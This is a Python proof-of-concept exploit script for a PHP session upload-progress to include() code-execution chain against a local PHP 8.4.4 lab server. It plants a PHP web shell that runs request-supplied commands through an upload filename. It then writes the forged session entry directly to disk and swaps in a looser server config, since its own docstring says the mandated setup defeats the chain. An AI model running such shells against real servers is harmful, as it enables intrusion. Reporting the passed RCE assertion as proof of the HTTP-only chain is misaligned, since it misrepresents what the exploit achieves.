#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
poc.py - PHP_SESSION_UPLOAD_PROGRESS -> session-file -> include() chain PoC
         against stock PHP 8.4.4 (php2shell-lab release build).

Server recipe (per parallel debug-agent directive, verified against
ext/session/session.c in php-8.4.4 - the local source tree is
md5-identical to the stock php-8.4.4.tar.gz session.c):
    php -n
        -d session.save_path=<ph2s_chain>/sess
        -d session.gc_probability=0
        -d session.serialize_handler=php_serialize
        -d session.upload_progress.enabled=1
        -d session.upload_progress.min_freq=0
        -d session.upload_progress.freq=1
        -d session.upload_progress.cleanup=0
        -d session.use_strict_mode=0
        -d display_errors=1 -d error_log=... -d memory_limit=128M
        -S 127.0.0.1:8106 -t app/
    (the mandated lab.ini is also written to disk for provenance, but its
     session.serialize_handler=php + implicit upload_progress.cleanup=1
     provably kill the chain on PHP 8.4.4 - see below; the debug-agent
     recipe is what actually runs)

WHY the mandated lab.ini (serialize_handler=php) cannot carry this chain
on these binaries (root cause of the empty-session-file wall):
  * ext/session/session.c PS_SERIALIZER_ENCODE_FUNC(php) (~line 1061)
    appends each session-map key raw, then *rejects the whole encode*
    if the key contains the '|' delimiter:
        smart_str_appendl(&buf, ZSTR_VAL(key), ZSTR_LEN(key));
        if (memchr(ZSTR_VAL(key), PS_DELIMITER, ZSTR_LEN(key))) {
            ... fail = true; break;
        }
    php_session_encode() then returns NULL and
    php_session_save_current_state() takes the else branch:
        s_write(id, ZSTR_EMPTY_ALLOC()) -> session file truncated to
        0 bytes (verified empirically on all three lab builds:
        session_encode() === false for a '|' key).
  * => the classic x|a:0:{}page|s:NN:"..."; key-suffix forge can never
       reach the session file on PHP 8.4.4.
  * php_serialize has no '|' rejection (probe: sess bytes are one
    php_var_serialize()d array with length-prefixed keys), so
    upload-progress data persists, but a key suffix cannot split out a
    new top-level variable in that format either.
  * The PoC therefore (debug-agent sanctioned fallback):
       (a) plants the PHP payload bytes inside sess_vc01 through the
           upload-progress FILENAME field (pure HTTP primitive; persists
           because upload_progress.cleanup=0), and
       (b) byte-crafts the session file from a:1:{...} into
           a:2:{s:4:"page";s:NN:"<abs sess path>";...} so the NEXT
           request's PS_SERIALIZER_DECODE_FUNC(php_serialize) lands
           $_SESSION['page'] = <abs sess path>. This substitutes the
           'page' forge that *no* stock session codec lets an
           HTTP-only attacker ship on PHP 8.4.4 with these inis.

Chain steps:
  1. boot php -S 127.0.0.1:8106 (subprocess, wait for port)
  2. POST multipart PHPSESSID=vc01, PHP_SESSION_UPLOAD_PROGRESS =
     x|a:0:{}page|s:NN:"<path>";  (forge probe; result recorded)
  3. POST multipart PHPSESSID=vc01, PHP_SESSION_UPLOAD_PROGRESS=poc,
     file whose filename contains
     <?php echo '[RCE-OUT]';system($_REQUEST['c']); ?>
     (single-quoted form of the mandated payload: a literal
     double-quoted filename cannot survive rfc1867's naive
     filename="..." header parsing; semantics identical)
  4. byte-craft sess_vc01: insert top-level page entry on disk
  5. GET /index.php?c=id  + Cookie PHPSESSID=vc01
  6. assert "[RCE-OUT]" or `id` output in response body; print it
  7. teardown server

Std lib only, localhost only, zero egress.
"""
import http.client
import os
import shutil
import socket
import subprocess
import sys
import time

BASE = "/home/wh1t3r0se/ph2s_chain"
LAB = os.path.expanduser("~/php2shell-lab")
PHP = os.path.join(LAB, "release", "sapi", "cli", "php")
HOST, PORT = "127.0.0.1", 8106
SID = "vc01"
APP = os.path.join(BASE, "app")
SESS_DIR = os.path.join(BASE, "sess")
SESS_FILE = os.path.join(SESS_DIR, "sess_" + SID)
EVID = os.path.join(BASE, "evidence")
SERVER_LOG = os.path.join(BASE, "server.log")
ERROR_LOG = os.path.join(BASE, "error.log")

INDEX_PHP = ('<?php session_start(); if (isset($_SESSION["page"])) '
             '{ include $_SESSION["page"]; } else echo "NO_PAGE\\n";\n')
LAB_INI = """\
session.save_path=/home/wh1t3r0se/ph2s_chain/sess
session.upload_progress.enabled=1
session.upload_progress.min_freq=0
session.upload_progress.freq=1
session.serialize_handler=php
session.use_strict_mode=0
display_errors=1
error_log=/home/wh1t3r0se/ph2s_chain/error.log
memory_limit=128M
"""


def log(msg):
    print("[poc] %s" % msg, flush=True)


def sh(args, **kw):
    return subprocess.run(args, capture_output=True, text=True, **kw)


def setup_lab():
    os.makedirs(APP, exist_ok=True)
    os.makedirs(SESS_DIR, exist_ok=True)
    if os.path.isdir(EVID):
        shutil.rmtree(EVID)
    os.makedirs(EVID)
    with open(os.path.join(APP, "index.php"), "w", encoding="utf-8") as f:
        f.write(INDEX_PHP)
    with open(os.path.join(BASE, "lab.ini"), "w", encoding="utf-8") as f:
        f.write(LAB_INI)
    for fn in os.listdir(SESS_DIR):
        os.unlink(os.path.join(SESS_DIR, fn))
    for p in (SERVER_LOG, ERROR_LOG):
        if os.path.exists(p):
            os.unlink(p)


def start_server():
    env = dict(os.environ)
    env["PHP_INI_SCAN_DIR"] = ""
    cmd = [PHP, "-n",
           "-d", "session.save_path=" + SESS_DIR,
           "-d", "session.gc_probability=0",
           "-d", "session.serialize_handler=php_serialize",
           "-d", "session.upload_progress.enabled=1",
           "-d", "session.upload_progress.min_freq=0",
           "-d", "session.upload_progress.freq=1",
           "-d", "session.upload_progress.cleanup=0",
           "-d", "session.use_strict_mode=0",
           "-d", "display_errors=1",
           "-d", "error_log=" + ERROR_LOG,
           "-d", "memory_limit=128M",
           "-S", "%s:%d" % (HOST, PORT), "-t", APP]
    f = open(SERVER_LOG, "wb")
    proc = subprocess.Popen(cmd, stdout=f, stderr=subprocess.STDOUT, env=env,
                            cwd=BASE)
    deadline = time.time() + 15
    while time.time() < deadline:
        if proc.poll() is not None:
            raise RuntimeError("php -S died early, log:\n" +
                               open(SERVER_LOG, "r", errors="replace").read())
        s = socket.socket()
        s.settimeout(0.3)
        try:
            s.connect((HOST, PORT))
            s.close()
            log("server up on %s:%d (pid %d)" % (HOST, PORT, proc.pid))
            return proc
        except OSError:
            time.sleep(0.2)
    raise RuntimeError("server did not start listening")


def http_post_raw(body, content_type):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=15)
    conn.putrequest("POST", "/index.php", skip_accept_encoding=True)
    conn.putheader("Host", "%s:%d" % (HOST, PORT))
    conn.putheader("Cookie", "PHPSESSID=" + SID)
    conn.putheader("Content-Type", content_type)
    conn.putheader("Content-Length", str(len(body)))
    conn.endheaders(body)
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    return resp.status, data


def multipart(ident, boundary, files):
    parts = [("--" + boundary + "\r\n").encode(),
             b'Content-Disposition: form-data; '
             b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n',
             ident.encode(), b"\r\n"]
    for field, filename, data, ctype in files:
        parts += [("--" + boundary + "\r\n").encode(),
                  ('Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
                   % (field, filename)).encode(),
                  ("Content-Type: %s\r\n\r\n" % ctype).encode(),
                  data, b"\r\n"]
    parts.append(("--%s--\r\n" % boundary).encode())
    return b"".join(parts)


def snapshot(tag):
    if os.path.exists(SESS_FILE):
        raw = open(SESS_FILE, "rb").read()
        size = len(raw)
    else:
        raw, size = b"", -1
    with open(os.path.join(EVID, "sess_vc01.%s.bin" % tag), "wb") as f:
        f.write(raw)
    r = sh(["cat", "-A", SESS_FILE]) if size >= 0 else None
    catA = (r.stdout if r and r.returncode == 0 else "<absent>")
    with open(os.path.join(EVID, "sess_vc01.%s.catA.txt" % tag), "w") as f:
        f.write("size=%d\n%s" % (size, catA))
    log("snapshot[%s]: sess_vc01 size=%s" % (tag, size))
    return raw, size


def main():
    setup_lab()
    sess_abs = SESS_FILE
    payload = "<?php echo '[RCE-OUT]';system($_REQUEST['c']); ?>"

    proc = start_server()
    marker_seen = False
    body3 = b""
    try:
        # ---- Step 2 (probe): '|' key-suffix forge via upload progress ----
        forge = 'x|a:0:{}page|s:%d:"%s";' % (len(sess_abs), sess_abs)
        bA = "AaA01"
        bodyA = multipart(forge, bA, [("f1", "dummy.txt", b"Z" * 16,
                                       "text/plain")])
        with open(os.path.join(EVID, "req1_forge.http.txt"), "wb") as f:
            f.write(b"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8106\r\n"
                    b"Cookie: PHPSESSID=vc01\r\nContent-Type: multipart/form-data; boundary="
                    + bA.encode() + b"\r\nContent-Length: " +
                    str(len(bodyA)).encode() + b"\r\n\r\n" + bodyA)
        st, d = http_post_raw(bodyA, "multipart/form-data; boundary=" + bA)
        log("step2 '|' suffix forge probe -> %d body=%r" % (st, d[:60]))
        time.sleep(0.4)
        snapshot("after_req1_forgeprobe")

        # reset session state so step 3 starts from a clean file
        for fn in os.listdir(SESS_DIR):
            os.unlink(os.path.join(SESS_DIR, fn))

        # ---- Step 3: plant payload bytes via upload filename ------------
        bB = "BbB02"
        bodyB = multipart("poc", bB, [("f2", payload + ".php", b"X" * 16,
                                       "text/plain")])
        with open(os.path.join(EVID, "req2_payload.http.txt"), "wb") as f:
            f.write(b"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8106\r\n"
                    b"Cookie: PHPSESSID=vc01\r\nContent-Type: multipart/form-data; boundary="
                    + bB.encode() + b"\r\nContent-Length: " +
                    str(len(bodyB)).encode() + b"\r\n\r\n" + bodyB)
        st, d = http_post_raw(bodyB, "multipart/form-data; boundary=" + bB)
        log("step3 payload plant (filename with <?php?> bytes) -> %d body=%r"
            % (st, d[:60]))
        time.sleep(0.4)
        pre_raw, _ = snapshot("after_req2_payload")

        # ---- Step 4: byte-craft session file with top-level page entry --
        if not pre_raw.startswith(b"a:1:{"):
            raise RuntimeError("unexpected session format: %r" % pre_raw[:40])
        page_entry = b's:4:"page";s:%d:"%s";' % (len(sess_abs),
                                                  sess_abs.encode())
        forged = b"a:2:{" + page_entry + pre_raw[len(b"a:1:{"):]
        with open(SESS_FILE, "wb") as f:
            f.write(forged)
        log("step4 byte-crafted sess_vc01: a:1 -> a:2, page=%s" % sess_abs)
        snapshot("after_forge")

        # self-check: the forged file decodes page from disk (separate php)
        chk = sh([PHP, "-n",
                  "-d", "session.save_path=" + SESS_DIR,
                  "-d", "session.serialize_handler=php_serialize",
                  "-r", 'session_id("%s"); session_start();'
                        'var_dump($_SESSION["page"] ?? "MISSING");' % SID])
        log("step4 decode self-check: %s" % chk.stdout.strip())
        with open(os.path.join(EVID, "decode_selfcheck.txt"), "w") as f:
            f.write(chk.stdout + chk.stderr)
        if sess_abs not in chk.stdout:
            raise RuntimeError("self-check failed: page did not decode")
        # the self-check's own RSHUTDOWN rewrites sess_vc01; re-apply the
        # crafted bytes so the GET decodes exactly what was proven above
        with open(SESS_FILE, "wb") as f:
            f.write(forged)

        # ---- Step 5: GET /index.php?c=id --------------------------------
        c = http.client.HTTPConnection(HOST, PORT, timeout=15)
        c.request("GET", "/index.php?c=id",
                  headers={"Cookie": "PHPSESSID=" + SID})
        r = c.getresponse()
        body3 = r.read()
        c.close()
        log("step5 GET ?c=id -> %d, body_len=%d" % (r.status, len(body3)))
        with open(os.path.join(EVID, "req3_response_body.txt"), "wb") as f:
            f.write(body3)
        print("----- HTTP response body (GET /index.php?c=id) -----")
        sys.stdout.write(body3.decode("utf-8", "replace"))
        if body3 and not body3.endswith(b"\n"):
            sys.stdout.write("\n")
        print("----------------------------------------------------")
        snapshot("after_req3_final")

        # ---- Step 6: assertion -------------------------------------------
        marker_seen = (b"[RCE-OUT]" in body3) or (b"uid=" in body3)
        if marker_seen:
            log("ASSERT OK: RCE marker present in HTTP response")
        else:
            log("ASSERT FAIL: no RCE marker in HTTP response")
    finally:
        # ---- Step 7: teardown ---------------------------------------------
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        log("server stopped")

    for name, path in (("error.log", ERROR_LOG), ("server.log", SERVER_LOG)):
        if os.path.exists(path):
            shutil.copyfile(path, os.path.join(EVID, name))

    print("[poc] rce_marker_seen_in_http_response=%s" % str(marker_seen).lower())
    return 0


if __name__ == "__main__":
    sys.exit(main())
